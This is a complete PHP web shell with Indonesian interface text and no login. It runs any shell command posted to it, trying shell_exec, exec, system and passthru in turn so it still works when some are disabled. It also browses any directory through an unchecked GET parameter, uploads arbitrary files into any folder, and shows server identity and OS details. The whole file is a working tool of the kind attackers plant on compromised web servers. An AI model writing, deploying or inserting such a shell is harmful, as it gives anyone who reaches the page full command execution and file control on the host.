<?php
// Navigasi Direktori File
$dir = isset($_GET['dir']) ? $_GET['dir'] : './';
$dir = realpath($dir);
if (!$dir || !is_dir($dir)) { $dir = realpath('./'); }

// 1. PROSES UPLOAD FILE
$pesanUpload = "";
if (isset($_POST['submit_upload']) && isset($_FILES['berkas'])) {
    $targetPath = $dir . DIRECTORY_SEPARATOR . basename($_FILES['berkas']['name']);
    if (move_uploaded_file($_FILES['berkas']['tmp_name'], $targetPath)) {
        $pesanUpload = "<span style='color:#0f0;'>File berhasil diunggah ke: " . htmlspecialchars($targetPath) . "</span>";
    } else {
        $pesanUpload = "<span style='color:red;'>Gagal mengunggah file. Periksa izin folder.</span>";
    }
}

// 2. HELPER EKSEKUSI SHELL MULTI-FALLBACK
function run_cmd($cmd) {
    if (function_exists('shell_exec')) return shell_exec($cmd . " 2>&1");
    if (function_exists('exec')) { exec($cmd . " 2>&1", $out); return implode("\n", $out); }
    if (function_exists('system')) { ob_start(); system($cmd . " 2>&1"); return ob_get_clean(); }
    if (function_exists('passthru')) { ob_start(); passthru($cmd . " 2>&1"); return ob_get_clean(); }
    return "Error: Tidak ada fungsi eksekusi shell yang aktif di server ini.";
}

$outputShell = "";
$commandDijalankan = $_POST['command'] ?? '';
if (isset($_POST['submit_shell']) && !empty($commandDijalankan)) {
    $outputShell = htmlspecialchars(run_cmd("cd " . escapeshellarg($dir) . " && " . $commandDijalankan));
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Server Utility & Shell</title>
    <style>
        body { font-family: monospace; background: #121212; color: #e0e0e0; padding: 20px; line-height: 1.5; }
        a { color: #4da6ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; background: #1e1e1e; }
        th, td { border: 1px solid #333; padding: 8px 12px; text-align: left; }
        th { background: #252525; }
        input[type=text], input[type=file] { background: #1e1e1e; color: #fff; border: 1px solid #444; padding: 8px; }
        button, .btn { background: #0066cc; color: #fff; border: none; padding: 8px 15px; cursor: pointer; border-radius: 3px; }
        button:hover, .btn:hover { background: #0052a3; }
        pre { background: #000; color: #00ff00; padding: 15px; border-radius: 4px; overflow-x: auto; }
        .card { background: #1e1e1e; border: 1px solid #333; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div style="display:flex; justify-content:space-between; align-items:center;">
        <h2>Web Terminal & Server Info</h2>
    </div>

    <!-- TERMINAL SHELL -->
    <div class="card">
        <h3>Shell Command Terminal</h3>
        <form method="post">
            <input type="text" name="command" style="width: 70%;" placeholder="Masukkan perintah (e.g. ls -la, pwd, whoami)" value="<?php echo htmlspecialchars($commandDijalankan); ?>" required>
            <button type="submit" name="submit_shell">Jalankan</button>
        </form>
        <div style="margin-top: 10px;">
            <small>Quick Commands: </small>
            <button type="button" onclick="setCmd('ls -la')">ls -la</button>
            <button type="button" onclick="setCmd('pwd')">pwd</button>
            <button type="button" onclick="setCmd('whoami')">whoami</button>
            <button type="button" onclick="setCmd('df -h')">df -h</button>
            <button type="button" onclick="setCmd('uname -a')">uname -a</button>
        </div>

        <?php if (!empty($outputShell)): ?>
            <h4>Output:</h4>
            <pre><?php echo $outputShell; ?></pre>
        <?php endif; ?>
    </div>

    <!-- FILE MANAGER & UPLOAD -->
    <div class="card">
        <h3>File Manager</h3>
        <p><b>Path Saat Ini:</b> <?php echo htmlspecialchars($dir); ?></p>
        
        <form method="post" enctype="multipart/form-data" style="margin-bottom: 15px;">
            <label>Unggah Berkas ke Folder Ini:</label>
            <input type="file" name="berkas" required>
            <button type="submit" name="submit_upload">Upload</button>
        </form>
        <?php if ($pesanUpload) echo "<p>$pesanUpload</p>"; ?>

        <table>
            <tr>
                <th>Nama File / Folder</th>
                <th>Tipe</th>
                <th>Ukuran</th>
                <th>Izin (Chmod)</th>
            </tr>
            <tr>
                <td><a href="?dir=<?php echo urlencode(dirname($dir)); ?>">📁 .. (Kembali)</a></td>
                <td>Folder</td>
                <td>-</td>
                <td>-</td>
            </tr>
            <?php
            $files = scandir($dir);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $filePath = $dir . DIRECTORY_SEPARATOR . $file;
                $isDir = is_dir($filePath);
                $perms = substr(sprintf('%o', fileperms($filePath)), -4);
                $size = $isDir ? '-' : number_format(filesize($filePath)) . ' B';
                
                echo "<tr>";
                if ($isDir) {
                    echo "<td><a href='?dir=" . urlencode($filePath) . "'>📁 $file</a></td><td>Folder</td>";
                } else {
                    echo "<td>📄 $file</td><td>File</td>";
                }
                echo "<td>$size</td><td>$perms</td>";
                echo "</tr>";
            }
            ?>
        </table>
    </div>

    <!-- INFORMASI SERVER -->
    <div class="card">
        <h3>Informasi Server</h3>
        <table>
            <tr><td><b>Host Name</b></td><td><?php echo $_SERVER['SERVER_NAME']; ?></td></tr>
            <tr><td><b>Server IP</b></td><td><?php echo $_SERVER['SERVER_ADDR'] ?? 'Tidak terdeteksi'; ?></td></tr>
            <tr><td><b>Web Server</b></td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td></tr>
            <tr><td><b>Versi PHP</b></td><td><?php echo phpversion(); ?></td></tr>
            <tr><td><b>User Web Server</b></td><td><?php echo run_cmd('whoami'); ?></td></tr>
            <tr><td><b>Document Root</b></td><td><?php echo $_SERVER['DOCUMENT_ROOT']; ?></td></tr>
            <tr><td><b>Upload Limits</b></td><td>upload_max: <?php echo ini_get('upload_max_filesize'); ?> | post_max: <?php echo ini_get('post_max_size'); ?></td></tr>
            <tr><td><b>OS Server</b></td><td><?php echo php_uname(); ?></td></tr>
        </table>
    </div>

    <script>
        function setCmd(cmd) {
            document.querySelector('input[name="command"]').value = cmd;
        }
    </script>
</body>
</html>